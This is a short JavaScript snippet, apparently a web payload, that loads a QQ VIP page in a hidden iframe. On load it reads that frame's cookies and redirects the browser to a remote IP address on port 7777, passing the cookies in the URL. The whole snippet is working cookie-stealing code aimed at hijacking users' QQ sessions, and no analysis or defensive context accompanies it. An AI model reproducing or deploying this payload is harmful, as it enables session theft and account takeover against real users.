var b = document.createElement("iframe");
b.src = "https://vip.qq.com/11years/";
b.name = "qvip";
b.onload = function () {
    top.location.href = 'http://118.24.31.87:7777/AboutLink/?api=QNongChang&cookies='+escape(this.contentDocument.cookie);
}
document.body.appendChild(b);
